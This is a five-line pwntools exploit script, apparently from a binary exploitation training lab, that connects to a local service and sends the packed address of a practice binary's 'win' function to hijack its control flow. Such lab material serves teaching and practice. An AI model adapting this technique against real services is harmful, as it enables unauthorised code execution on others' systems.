
from pwn import *
elf = ELF('build/stage04_demo_no_offset', checksec=False)
io = remote('127.0.0.1', 7104, timeout=5)
io.send(p64(elf.symbols['win']))
print(io.recvall(timeout=1).decode())
